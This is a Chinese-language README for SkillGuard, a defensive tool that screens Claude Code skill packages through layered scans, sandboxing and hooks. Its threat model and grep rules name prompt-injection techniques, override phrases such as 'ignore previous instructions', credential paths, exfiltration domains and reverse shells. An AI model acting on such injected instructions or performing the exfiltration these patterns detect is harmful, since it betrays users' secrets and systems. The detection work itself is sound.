# SkillGuard

> Claude Code 技能安装安全审查流水线 — 四层防御 + 六层自保护 + SLSA Level 3
>
> **背景**：ClawHavoc 事件（2026年2月，1184+ 恶意技能包）后的防御方案
> **版本**：v5.6.4 | **最后更新**：2026-03-15 | **许可证**：AGPL-3.0

## 快速安装

```bash
# 1. 克隆仓库
git clone https://github.com/xuxianbang1993/SkillGuard.git
cd SkillGuard

# 2. 一键配置 Hook（自动写入 ~/.claude/settings.json）
bash 一键配置.sh            # 交互模式（有提示确认）
bash 一键配置.sh --yes      # 非交互模式（自动确认，适合自动化安装）

# 安装完成后启动 Claude Code 即生效
```

> **安装原理**：脚本将 SkillGuard 的三个 PreToolUse Hook（Bash/Write/Edit）配置到 `~/.claude/settings.json`，不覆盖已有配置。安装任何非官方技能时将自动触发四层安全审查。

## 更新

SkillGuard 支持自动更新检查。每次启动 Claude Code 新会话时，会自动从 GitHub 检测是否有新版本，并提示更新。

```bash
# 手动更新（一键完成：拉取代码 + 更新校验 + 重新配置 Hook）
cd SkillGuard
bash update.sh

# 更新后自动显示：
#   ✅ 更新完成：v5.4 → v5.6
#   🆕 新功能：自动更新检查、一键更新脚本...
#   ⬆️ 改进：...
#   🔧 修复：...
```

> **自动检查原理**：`skillguard-gate.sh` 在每次会话首次触发时（6 小时一次），用 `curl` 从 GitHub 获取最新 `VERSION` 文件，与本地版本对比。超时 3 秒自动跳过，离线不影响正常使用。

---

## 1. 当前环境状态

| 组件 | 状态 | 备注 |
|------|------|------|
| Windows 11 家庭版 | ✅ 运行中 | 家庭版，**不支持 Windows Sandbox** |
| WSL2 | ✅ 已安装 | `wsl --version` 可验证 |
| Ubuntu (WSL) | ✅ 已安装 | 用户名：`xuxianbang`，home：`/home/xuxianbang` |
| Docker Desktop | ✅ 已安装 | 使用 WSL2 后端 |
| 火绒安全 | ✅ 已安装 | `C:\Program Files\Huorong\Sysdiag\bin\HipsMain.exe` |
| skill-vetter | ✅ 已安装 | `~/.claude/.agents/skills/skill-vetter/` |
| Windows Sandbox | ❌ 不可用 | 家庭版限制，无需等待，已用 Docker Sandbox 替代 |
| Docker Sandbox (microVM) | ✅ 可用 | Docker 29.2.1，`docker sandbox ls` 验证通过 |

**验证命令**（新会话恢复时运行）：
```powershell
wsl --list --verbose
docker --version
docker sandbox ls
"C:\Program Files\Huorong\Sysdiag\bin\HipsMain.exe" /?
```

---

## 2. 威胁模型

### ClawHavoc 事件（2026年2月）
- ClawHub 审计发现 820+ 技能（约 20%）含恶意行为
- Snyk ToxicSkills 研究：扫描 3,984 个技能，13% 含严重安全漏洞
- 受影响渠道：ClawHub 独占技能风险最高

### 四类威胁模式

```
A. Prompt Injection（提示词注入）← 最隐蔽，传统杀毒无效
   ├── HTML 注释隐藏指令（肉眼不可见）
   ├── 零宽字符编码隐藏内容（U+200B/200C/200D/FEFF）
   ├── 权威+紧迫语言组合（"SYSTEM CRITICAL: immediately..."）
   ├── 指令覆盖（"ignore previous instructions"）
   └── 凭证外传触发器（API_KEY 注入到 URL 参数）

B. 嵌入式恶意代码（传统意义的病毒/木马）
   ├── curl/wget 向外发送本地文件
   ├── base64 解码 + eval() 混淆执行
   ├── 读取 ~/.ssh、~/.aws、MEMORY.md（凭证窃取）
   ├── process.env / os.environ 访问（环境变量窃取）
   └── child_process / subprocess 执行系统命令

C. 供应链攻击
   ├── npx -y <unpinned-package>（每次拉取最新，版本可被污染）
   ├── curl https://x.com/install.sh | bash（经典供应链）
   └── @latest/@next 浮动标签（可被重定向）

D. 持久化控制
   ├── 修改 CLAUDE.md（劫持后续所有会话）
   ├── 修改 ~/.claude/settings.json（CVE-2025-59536）
   ├── 篡改 hooks（执行任意钩子命令）
   └── 修改 ~/.bashrc / ~/.zshrc（Shell 启动劫持）
```

> **关键认知**：Claude Code 技能文件是 Markdown 自然语言指令，Prompt Injection 藏在语义里，传统杀毒软件特征库完全无法检测。必须专项扫描。

---

## 3. 信任层级

| 优先级 | 来源 | 风险 | SkillGuard Gate 行为 |
|--------|------|------|---------------------|
| ⭐ 1 | `anthropics/skills` | 极低 | **白名单直接放行**（`exit 0`，跳过全部审查） |
| ⭐ 1 | `vercel-labs/ai-sdk-skills` | 极低 | **白名单直接放行**（同上） |
| ⭐ 3 | GitHub 高 stars 社区技能 | 中 | **拦截 → 全审查 → 凭证放行** |
| ⭐ 4 | GitHub 低安装量/未知作者 | 高 | **拦截 → 全审查（含 L3）→ 凭证放行** |
| ⚠️ 5 | **ClawHub**（有 GitHub 源可验证） | 极高 | **拦截 → 全审查（L3 强制）→ 凭证放行** |
| ❌ 禁止 | **ClawHub 独占**（无 GitHub 源码） | 不可接受 | **拒绝安装** |

> **白名单机制**：`skillguard-gate.sh` 的 `is_trusted_source()` 使用 `case` 精确匹配**组织/仓库名**（非前缀匹配）。`anthropics/skills` 下所有技能（brainstorming、writing-plans 等）均自动放行，`anthropics/skills-evil` 则不匹配。
>
> **凭证机制**：非官方技能审查通过后，`skillguard-gate.sh` 在 `.approved/` 目录写入**一次性凭证**。用户确认「继续安装」后 Claude 重新执行安装命令，凭证验证通过后**立即删除**，确保每次安装都触发完整审查。

### 安装命令规范
```bash
# ✅ 最优先：从 skills.sh（GitHub 源）安装
npx skills@latest add anthropics/skills@<skill-name> -g -y

# ✅ 可接受：从 GitHub 安装（审查通过后）
npx skills@latest add <owner>/<repo>@<skill> -g -y

# ⚠️  允许但必须走完四层：ClawHub（需有 GitHub 镜像可验证源码）
npx clawhub@latest install <slug>

# ❌ 绝对禁止：ClawHub 独占（无法找到 GitHub 源码）
```

---

## 4. 五层防御流程

```
新技能（任意来源）
        │
        ▼ PRE-CHECK
┌─────────────────────────────────────────────────────────┐
│  来源确认：npx skills@latest find <keyword>              │
│  → 确认作者 / 安装量 / 更新日期 / GitHub 源码是否存在      │
│  ClawHub 独占（无源码）? → ❌ 立即拒绝                    │
└─────────────────────────────────────────────────────────┘
        │
        ▼
╔════════════════════════════════════════════════════════╗
║  LAYER 0：火绒 AV 扫描（传统病毒/木马/已知恶意代码）      ║
║  耗时：10-30 秒 | 工具：HipsMain.exe -s "路径"           ║
║                                                        ║
║  "C:\Program Files\Huorong\Sysdiag\bin\HipsMain.exe"  ║
║    -s "C:\path\to\skill-folder"                        ║
║                                                        ║
║  发现威胁 → ❌ 拒绝，火绒自动隔离/删除                   ║
║  未发现   → ✅ 进入 Layer 1                              ║
╚════════════════════════════════════════════════════════╝
        │
        ▼
╔════════════════════════════════════════════════════════╗
║  LAYER 1：静态语义扫描（Prompt Injection 专项）          ║
║  耗时：<30 秒 | 工具：skill-vetter + 自定义 grep 脚本    ║
║                                                        ║
║  扫描项（v5.0: 24+ 检测项）：                             ║
║  □ HTML 注释隐藏指令 / 零宽字符 / BiDi 控制字符          ║
║  □ Unicode Tag ASCII Smuggling / Homoglyph 混淆字符     ║
║  □ 权威+紧迫语言组合 / 指令覆盖（多语言）                ║
║  □ 凭证关键词 / 外传域名 / DNS 外传 / 环境变量外传       ║
║  □ Base64 混淆注入 / 多层编码混淆 / 反向 Shell          ║
║  □ MCP 工具描述注入 / Hook 注入（CVE-2025-59536）       ║
║  □ RAG 投毒（Frontmatter/CSS隐藏/Data URI/伪造系统消息） ║
║  □ Markdown 图片外传                                    ║
║                                                        ║
║  HIGH/EXTREME → ❌ 拒绝                                ║
║  MEDIUM       → ⚠️  携带标记继续                       ║
║  LOW          → ✅ 进入路由判断                          ║
╚════════════════════════════════════════════════════════╝
        │
        ▼
╔════════════════════════════════════════════════════════╗
║  LAYER 2：Docker 代码行为扫描（网络完全断开）             ║
║  耗时：1-2 分钟 | 工具：docker run（强化参数）            ║
║                                                        ║
║  docker run --rm                                       ║
║    --network none       ← 完全断网                     ║
║    --read-only          ← 文件系统只读                  ║
║    --cap-drop ALL       ← 删除全部 Linux 权限           ║
║    --memory 256m        ← 内存上限                     ║
║    -v "skill:/scan:ro"  ← 只读挂载                     ║
║    skillguard bash -c "grep 扫描..."                ║
║                                                        ║
║  安全参数：--no-new-privileges --pids-limit 100         ║
║      --user 1000:1000 --tmpfs /tmp:noexec               ║
║                                                        ║
║  扫描：eval/exec/base64 / 危险路径 / 持久化 /            ║
║        unpinned 供应链 / 环境变量窃取                   ║
║                                                        ║
║  通过   → ✅ 进入路由判断                               ║
║  有命中 → ⚠️  人工复核                                 ║
╚════════════════════════════════════════════════════════╝
        │ ClawHub / 极低信任 / MEDIUM 标记 → 继续
        ▼
╔════════════════════════════════════════════════════════╗
║  LAYER 3：动态执行测试（Docker Sandbox microVM）         ║
║  耗时：1-3 分钟 | 条件：Docker Desktop ≥ 4.44.3         ║
║  触发：ClawHub / 极低信任 / MEDIUM 标记 / L1 WARN       ║
║                                                        ║
║  自动流程（v4.0 全自动化）：                               ║
║  1. 创建隔离 microVM，自动安装技能                        ║
║  2. 收集行为日志：网络/文件/进程/crontab/shell rc         ║
║  3. 自动分析：网络工具调用/敏感目录访问/持久化行为          ║
║  4. 销毁 microVM（零残留）                               ║
║                                                        ║
║  隔离强度：独立内核 + 私有 Docker daemon = VM 级隔离      ║
╚════════════════════════════════════════════════════════╝
        │ 全部通过
        ▼
┌─────────────────────────────────────────────────────────┐
│  审查通过 → 颁发一次性凭证（.approved/ 目录）               │
│  skillguard-gate.sh 写入 SHA256(source) → timestamp           │
│                                                          │
│  用户确认「继续安装」→ Claude 重新执行 npx 命令            │
│  → skillguard-gate.sh 检测到凭证 → 验证 → 立即删除 → exit 0   │
│  → 原始安装命令正常执行 ✅                                │
│  → 再次安装同一技能 → 必须重新走完整审查流程               │
│                                                          │
│  安装后自动验证：SHA256 基线校验                           │
│  → 确认 CLAUDE.md / settings.json / hooks 未被篡改       │
└─────────────────────────────────────────────────────────┘
```

### 来源 × 层级矩阵

```
来源                     L0火绒  L1语义  L2代码  L3虚拟机
──────────────────────────────────────────────────────────
anthropics/skills          必做    必做    跳过    跳过
vercel-labs/* / 大厂官方   必做    必做    必做    跳过
GitHub 高 stars (>500)     必做    必做    必做    跳过
GitHub 低 stars / 新账号   必做    必做    必做    必做
ClawHub（有 GitHub 源）     必做    必做    必做    必做（强制）
ClawHub 独占               ─────────── 禁止安装 ───────────
```

---

## 5. 工具使用详情

### 5.1 火绒 AV 扫描（Layer 0）

```bash
# 扫描指定技能目录（Windows 路径格式）
"C:\Program Files\Huorong\Sysdiag\bin\HipsMain.exe" -s "C:\path\to\skill"

# 验证退出码（首次使用请实测一次）
"C:\Program Files\Huorong\Sysdiag\bin\HipsMain.exe" -s "C:\Windows\System32\notepad.exe"
echo "退出码：%ERRORLEVEL%"
# 预期：0 = 无威胁
```

> 注：`-s` 参数支持自定义路径查杀，扫描完成后退出。退出码 **0 = 无威胁**（已实测验证），非 0 = 发现威胁。火绒负责传统病毒特征库匹配，与我们的语义扫描完全互补。

### 5.2 Prompt Injection 语义扫描（Layer 1 核心）

```bash
# 运行位置：WSL / Git Bash
SKILL_DIR="/path/to/skill"

# [1] HTML 注释隐藏指令
grep -rPzo '<!--[\s\S]*?-->' "$SKILL_DIR" 2>/dev/null \
  | grep -iE 'execute|send|read|fetch|POST|include|ignore|override|system|admin'

# [2] 零宽字符
grep -rlP '[\x{200B}\x{200C}\x{200D}\x{FEFF}]' "$SKILL_DIR" 2>/dev/null

# [3] 权威+紧迫组合
grep -riE '(system|admin|critical|urgent).{0,50}(immediately|always|must|override)' "$SKILL_DIR"

# [4] 凭证关键词
grep -riE 'API_KEY|ANTHROPIC_KEY|Bearer|credentials|private.key' "$SKILL_DIR"

# [5] 指令覆盖
grep -riE 'ignore previous|override instruction|disregard|new instruction|higher priority' "$SKILL_DIR"

# [6] 已知外传域名
grep -riE 'webhook\.site|pipedream|requestbin|ngrok|burpcollaborator|interact\.sh' "$SKILL_DIR"
```

### 5.3 Docker 代码扫描（Layer 2）

```bash
# 构建镜像（一次性）
docker build -t skillguard -f Dockerfile.skillguard .

# 扫描（把 /path/to/skill 换成实际路径）
docker run --rm \
  --network none \
  --read-only \
  --cap-drop ALL \
  --security-opt no-new-privileges:true \
  --pids-limit 100 \
  --user 1000:1000 \
  --memory 256m \
  --tmpfs /tmp:size=10m,noexec \
  --tmpfs /dev/shm:size=1m,noexec \
  -v "/path/to/skill:/scan:ro" \
  skillguard \
  bash -c '
    echo "=== 外部请求检查 ==="
    grep -r "curl\|wget\|fetch\|axios\|urllib\|http://" /scan/ 2>/dev/null

    echo "=== 凭证访问检查 ==="
    grep -r "\.ssh\|\.aws\|MEMORY\.md\|credentials\|secret\|token\|password" /scan/ 2>/dev/null

    echo "=== 代码执行检查 ==="
    grep -r "eval\|exec\|base64\|child_process\|subprocess" /scan/ 2>/dev/null

    echo "=== 环境变量访问 ==="
    grep -r "process\.env\|os\.environ" /scan/ 2>/dev/null

    echo "=== 供应链风险 ==="
    grep -r "npx -y\|curl.*|.*bash\|@latest\|@next" /scan/ 2>/dev/null

    echo "=== 持久化后门 ==="
    grep -r "CLAUDE\.md\|settings\.json\|hooks\|\.bashrc\|crontab" /scan/ 2>/dev/null

    echo "=== 扫描完成 ==="
  '
```

### 5.4 Docker Sandbox 动态测试（Layer 3）

```bash
# 需要 Docker Desktop ≥ 4.60
# 验证是否支持
docker sandbox ls

# 创建 microVM 并在里面安装技能
docker sandbox run claude
# 进入后执行：
npx skills@latest add <skill-source> -g -y
# 观察有无异常网络请求、文件修改、进程启动

# 测试完毕，完全销毁
docker sandbox rm <sandbox-name>
# microVM 销毁 = 里面所有内容消失，主机零残留
```

> **隔离强度**：microVM 级别 = 独立内核 + 私有 Docker daemon，与 Windows Sandbox（Hyper-V）同等强度。Windows 11 家庭版不支持 Windows Sandbox，Docker Sandbox 是当前唯一的 Layer 3 方案。

### 5.5 文件篡改基线检测

```bash
# 安装技能前：记录基线
sha256sum ~/.claude/CLAUDE.md > /tmp/skill-baseline.txt
sha256sum ~/.claude/settings.json >> /tmp/skill-baseline.txt

# 安装技能后：验证完整性
sha256sum -c /tmp/skill-baseline.txt
# 输出 OK = 未被篡改
# 输出 FAILED = 已被修改，立即检查
```

---

## 6. 自保护体系（v5.3+ 新增）

SkillGuard 不仅保护用户系统，还保护自己不被篡改或恶意复制。

### 六层自保护架构

```
┌──────────────────────────────────────────────────────────┐
│           SkillGuard v5.6.4 自保护体系（6 层）            │
├──────────────────────────────────────────────────────────┤
│                                                          │
│  第 1 层：Hook 自保护                                     │
│  └ skillguard-write.sh 阻止 Claude Code 修改 SkillGuard  │
│    自身的脚本文件（.approved/ 凭证目录除外）               │
│                                                          │
│  第 2 层：SHA256 自检                                     │
│  └ 每次 Hook 触发时，校验所有核心脚本的 SHA256 哈希        │
│    与 checksums.sha256 Manifest 对比，不一致则拒绝工作     │
│                                                          │
│  第 3 层：远程哈希校验                                    │
│  └ 从 GitHub 拉取官方 checksums.sha256 对比（优先）       │
│    即使本地 Manifest 被篡改也能检测，离线降级到第 2 层     │
│                                                          │
│  第 4 层：SLSA Level 3 出处证明                           │
│  └ GitHub Artifact Attestations + Sigstore 签名           │
│    reusable workflow 隔离构建（不可篡改的构建过程）        │
│    用户验证：gh attestation verify <file> -o xuxianbang1993│
│                                                          │
│  第 5 层：AGPL-3.0 许可证                                │
│  └ 衍生品必须开源 + 署名原作者                           │
│    法律层面保护知识产权                                   │
│                                                          │
│  第 6 层：Release SHA256 校验和                           │
│  └ GitHub Release 自动附带 SHA256 校验文件                │
│    用户下载后可验证完整性                                 │
│                                                          │
└──────────────────────────────────────────────────────────┘
```

### 验证命令

```bash
# 方法 1：SLSA 出处验证（最强，推荐）
gh attestation verify skillguard-v5.6.4.tar.gz -o xuxianbang1993

# 方法 2：SHA256 校验（Release 下载后）
sha256sum -c checksums-release.sha256

# 方法 3：本地完整性自检（自动运行，无需手动）
# skillguard-gate.sh 每次触发时自动执行
```

### 攻击场景与防御

| 攻击场景 | 防御层 | 效果 |
|----------|--------|------|
| Claude Code 内部篡改脚本 | 第 1 层 Hook 自保护 | Write/Edit 被拦截 |
| 外部修改脚本文件 | 第 2+3 层 SHA256 自检 | 下次触发时检测到，拒绝工作 |
| 篡改本地 Manifest | 第 3 层远程校验 | 远程哈希无法伪造 |
| 伪造 Release 包 | 第 4 层 SLSA 签名 | Sigstore 签名验证失败 |
| Fork 后改名发布 | 第 5 层 AGPL 许可证 | 必须开源 + 署名，否则违法 |
| 下载被中间人篡改 | 第 6 层 SHA256 校验和 | 哈希不匹配 |

---

## 7. CLAUDE.md 规则摘要（更新至 v5.6.4）

以下条目可直接复制到 `CLAUDE.md`：

```markdown
## 技能安装安全规则（2026-03-15 v5.6.4 强制执行）

- **官方技能白名单**：`anthropics/skills` 和 `vercel-labs/ai-sdk-skills` 下所有技能自动放行（`case` 精确匹配组织/仓库名，非前缀匹配）
- **安装前必做 Layer 0**：用火绒扫描技能目录（自动检测路径）
- **安装前必做 Layer 1**：Prompt Injection 语义扫描（24+ 检测项，含 Homoglyph/RAG投毒/多层编码）
- **未知来源必做 Layer 2**：Docker 强化容器行为扫描（--network none --cap-drop ALL --no-new-privileges --pids-limit 100）
- **ClawHub / 极低信任必做 Layer 3**：Docker Sandbox microVM 全自动动态测试（行为日志收集+分析）
- **审查通过凭证**：非官方技能审查通过后颁发一次性凭证，用户确认「继续安装」后 Claude 重新执行即放行，凭证使用后立即删除（每次安装必审查）
- **Write/Edit 守卫**：SkillGuard Write (`skillguard-write.sh`) 拦截对 CLAUDE.md/settings.json/hooks/.bashrc 等敏感路径的写入
- **SHA256 完整性验证**：安装前自动建立基线，安装后自动校验关键文件未被篡改
- **CVE 版本预检**：自动检查 Docker/runc/Node.js 版本是否受已知 CVE 影响
- **红队验证**：`bash run-tests.sh` 运行 10 个测试样本验证 Layer 1 检测能力
- **ClawHub 政策**：允许安装，但必须有 GitHub 源码可验证，且走完四层审查
- **ClawHub 独占（无 GitHub 源）**：禁止安装
- **自动更新检查**：每次会话首次触发时从 GitHub 检测新版本（6h 一次，3s 超时，离线不影响），提示 `bash update.sh` 更新
- **首选安装源**：`npx skills@latest add anthropics/skills@<skill>` 或已验证 GitHub 源
- **完整方案参考**：`D:\Xuxianbang-Skills\SkillGuard\README.md`
```

---

## 8. 已审查技能清单（2026-03-13 存档）

审查工具：skill-vetter | 审查范围：37 个技能

### 🟢 LOW（30 个，安全）

**工程流程类**：executing-plans, finishing-a-development-branch, receiving-code-review, requesting-code-review, subagent-driven-development, systematic-debugging, test-driven-development, using-git-worktrees, using-superpowers, verification-before-completion, writing-plans, writing-skills

**文档/创意类**：brainstorming, dispatching-parallel-agents, docx, pptx, elite-powerpoint-designer, prd, humanizer-zh

**Apify 系列**：apify-actor-development, apify-influencer-discovery, apify-lead-generation, apify-market-research, apify-trend-analysis, apify-ultimate-scraper

**其他**：dogfood, electron, skill-vetter, agent-reach（空目录）

### 🟡 MEDIUM（7 个，有注意事项，非恶意）

| 技能 | 问题 | 实际风险 |
|------|------|---------|
| agent-browser | 浏览器自动化可访问任意页面 | 低，设计目的使然 |
| slack | 可读取 Slack 所有消息/DM | 低，需用户主动开启 |
| apify-actorization | 文档含 `curl \| bash` 安装建议 | 低，仅文档问题 |
| apify-audience-analysis | API Token 走 URL 参数 | 低，可能泄露到日志 |
| apify-brand-reputation | 同上 | 低 |
| apify-competitor-intelligence | 同上 | 低 |
| apify-content-analytics | 同上 | 低 |
| apify-ecommerce | 同上 | 低 |
| qa-test-planner | shell 脚本含 `eval "$var"` | 低，仅自身输入 |
| find-skills | 自动安装未审查技能（-y 标志） | 中，安装后需立即审查 |

### 🔴 HIGH / ⛔ EXTREME
无。

---

## 9. 文件清单

```
SkillGuard/
├── README.md                        ✅ 策略文档（本文件）v5.6.4
├── .gitattributes                   ✅ Git 行尾归一化配置（v5.6.4 新增）
├── VERSION                          ✅ 版本号文件
├── CHANGELOG.md                     ✅ 结构化更新日志
├── update.sh                        ✅ 一键更新脚本
├── uninstall.sh                     ✅ 一键卸载脚本（v5.6 新增）
├── LICENSE                          ✅ AGPL-3.0 许可证（v5.3 新增）
├── checksums.sha256                 ✅ 核心脚本 SHA256 校验和（v5.3 新增）
├── generate-checksums.sh            ✅ 校验和生成脚本（v5.3 新增）
├── Dockerfile.skillguard            ✅ Layer 2 Docker 镜像定义
├── skillguard-gate.sh               ✅ PreToolUse Hook — Bash 拦截器 + 自身完整性校验 + 版本检查
├── skillguard-write.sh              ✅ PreToolUse Hook — Write/Edit 守卫 + 自保护
├── skillguard-audit.sh              ✅ 扫描主控脚本 v5.0（Layer 0-3 + SHA256 + CVE预检）
├── 一键配置.sh                       ✅ 一键安装脚本（环境检测 + Hook 配置）
├── .approved/                       ✅ 审查通过凭证目录（一次性凭证，用后即删）
├── run-tests.sh                     ✅ 红队测试运行器（验证 Layer 1 检测能力）
├── test-fixtures/                   ✅ 红队测试样本（10 个，覆盖所有检测项）
│   ├── 01-clean-skill.md            ⬜ 干净样本（应通过）
│   ├── 02-prompt-injection.md       🔴 Prompt Injection
│   ├── 03-credential-theft.md       🔴 凭证窃取
│   ├── 04-exfil-domains.md          🔴 外传域名 + DNS 外传
│   ├── 05-reverse-shell.md          🔴 反向 Shell
│   ├── 06-multilang-injection.md    🔴 多语言指令覆盖
│   ├── 07-base64-obfuscation.md     🔴 Base64 混淆
│   ├── 08-hook-injection.md         🔴 Hook 注入
│   ├── 09-rag-poisoning.md          🔴 RAG 文档投毒
│   └── 10-env-exfil.md              🔴 环境变量外传 + 多层编码
└── .github/workflows/               ✅ SLSA Level 3 CI/CD（v5.3 新增）
    ├── slsa-release.yml             ✅ 发布工作流（签名 + Release）
    └── build-reusable.yml           ✅ 可复用构建（SLSA L3 隔离要求）
```

**Hook 接入配置**（写入 `~/.claude/settings.json`）：
```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [{
          "type": "command",
          "command": "bash D:/Xuxianbang-Skills/SkillGuard/skillguard-gate.sh"
        }]
      },
      {
        "matcher": "Write",
        "hooks": [{
          "type": "command",
          "command": "bash D:/Xuxianbang-Skills/SkillGuard/skillguard-write.sh"
        }]
      },
      {
        "matcher": "Edit",
        "hooks": [{
          "type": "command",
          "command": "bash D:/Xuxianbang-Skills/SkillGuard/skillguard-write.sh"
        }]
      }
    ]
  }
}
```

**审查通过后安装机制（v5.1 凭证放行）**：
1. 审查通过 → `skillguard-gate.sh` 自动颁发**一次性凭证**到 `.approved/` 目录
2. 用户告知 Claude「继续安装」→ Claude 重新执行原始 `npx` 安装命令
3. `skillguard-gate.sh` 检测到凭证 → 验证有效 → **立即删除凭证** → `exit 0` 放行
4. 安装正常执行，安装后自动进行 SHA256 完整性校验
5. 再次安装同一技能 → 凭证已删除 → **必须重新走完整审查流程**
6. 未使用的凭证 5 分钟后自动过期清理（防遗忘）

**安全保障**：
- 凭证文件名用 `SHA256(source)` 哈希，不暴露技能来源
- FAIL/MALICIOUS 判定**不颁发凭证**，永远无法放行
- WARN 判定需用户明确说「释放」，Claude 手动执行颁发命令后才可安装
- 凭证目录在项目内（`.approved/`），不影响全局环境

---

## 10. 常用命令速查

```bash
# ── 一键更新 ────────────────────────────────────────────
cd "D:\Xuxianbang-Skills\SkillGuard"
bash update.sh                       # 拉取 + 校验 + 配置 + 显示更新日志

# ── 环境验证 ────────────────────────────────────────────
wsl --list --verbose
docker --version
docker sandbox ls                    # 查看 microVM（需 Desktop ≥4.60）

# ── 火绒扫描 ────────────────────────────────────────────
# Windows CMD / PowerShell：
"C:\Program Files\Huorong\Sysdiag\bin\HipsMain.exe" -s "C:\path\to\skill"

# ── Docker 镜像构建（一次性）────────────────────────────
cd "D:\Xuxianbang-Skills\SkillGuard"
docker build -t skillguard -f Dockerfile.skillguard .

# ── Docker Sandbox microVM（Layer 3A）────────────────────
docker sandbox run claude            # 创建隔离 microVM
docker sandbox rm <sandbox-name>     # 销毁

# ── 文件基线 ────────────────────────────────────────────
sha256sum ~/.claude/CLAUDE.md ~/.claude/settings.json > /tmp/skill-baseline.txt
sha256sum -c /tmp/skill-baseline.txt # 安装后验证

# ── 技能搜索与安装 ───────────────────────────────────────
npx skills@latest find <keyword>
npx skills@latest add anthropics/skills@<skill-name> -g -y

# ── 已安装技能列表 ───────────────────────────────────────
ls ~/.claude/.agents/skills/
ls ~/.agents/skills/

# ── WSL 操作 ────────────────────────────────────────────
wsl -d Ubuntu
wsl -u root

# ── 红队测试 ───────────────────────────────────────────
cd "D:\Xuxianbang-Skills\SkillGuard"
bash run-tests.sh                   # 验证 Layer 1 检测能力（10/10 应全绿）
```

---

## 11. 迭代路线图（Phase 4+）

> 以下改进按优先级排列，可在后续会话中逐步实施。

### P0 — 高优先级

| 改进项 | 说明 | 预期收益 |
|--------|------|----------|
| **LLM-based 检测层** | 接入 PromptArmor / Rebuff / LLM Guard 等第三方服务，对技能文件做语义级 Prompt Injection 检测 | 弥补正则无法覆盖的语义变体（改写、同义替换等） |
| **mcp-scan 集成** | 接入 [invariantlabs/mcp-scan](https://github.com/invariantlabs/mcp-scan)，自动扫描 MCP 工具定义中的 Tool Poisoning | 检测 MCP 工具描述注入（84.2% 攻击成功率场景） |
| **PostToolUse 监控 Hook** | 在 Bash/Write/Edit 执行后检查关键文件是否被修改（CLAUDE.md/settings.json/hooks/） | 运行时篡改检测，与 SHA256 基线互补 |

### P1 — 中优先级

| 改进项 | 说明 | 预期收益 |
|--------|------|----------|
| **CI 自动化红队测试** | 将 `run-tests.sh` 接入 GitHub Actions / 本地 pre-commit hook | 每次修改检测规则后自动回归验证 |
| **Homoglyph 扩展：完整 Unicode Confusables 表** | 从 Unicode TR39 `confusables.txt` 导入完整映射（当前仅 40+ 高频） | 覆盖更多长尾伪装字符 |
| **技能版本锁定 + 哈希固定** | 安装时记录 `sha256sum` → 允许列表，后续加载时验证 | 防止已审查技能被远程篡改（供应链攻击） |
| **网络行为沙盒监控** | Layer 3 microVM 内 `tcpdump` 捕获网络流量，分析 DNS/HTTP 外传 | 检测运行时外传行为（比进程检查更精准） |

### P2 — 低优先级 / 探索性

| 改进项 | 说明 | 预期收益 |
|--------|------|----------|
| **RAG 投毒深度检测** | 对 Markdown 渲染后的 DOM 做隐藏元素分析（CSS computed style 检查） | 检测更复杂的 CSS 隐藏变体 |
| **多语言 NLP 注入检测** | 用小型分类器（BERT/DistilBERT）识别多语言 Prompt Injection 语义 | 超越关键词匹配的语义理解 |
| **供应链溯源** | 自动拉取技能包的 npm/GitHub 发布记录，检测维护者变更/异常版本跳跃 | 检测账户接管型供应链攻击 |
| **审查报告持久化** | 将每次审查结果存入 `~/.claude/audit-logs/` 并生成时间线 | 可追溯审查历史，支持合规审计 |
| **动态 Canary Token** | 在 microVM 中植入蜜罐文件（假凭证/假 SSH key），检测技能是否尝试读取 | 主动诱捕而非被动检测 |

### 架构演进方向

```
当前 v5.6.4（安全评分 ~9.5/10）← 六层自保护 + SLSA L3 + 安全加固 + 跨平台 + 安装验证
    │
    ▼ Phase 4: LLM 检测层 + mcp-scan + PostToolUse Hook
    │  预期评分：9.4/10
    │
    ▼ Phase 5: 版本锁定 + 网络监控
    │  预期评分：9.6/10
    │
    ▼ Phase 6: NLP 检测 + 供应链溯源 + Canary Token
    │  预期评分：9.8/10（接近生产级安全框架）
```
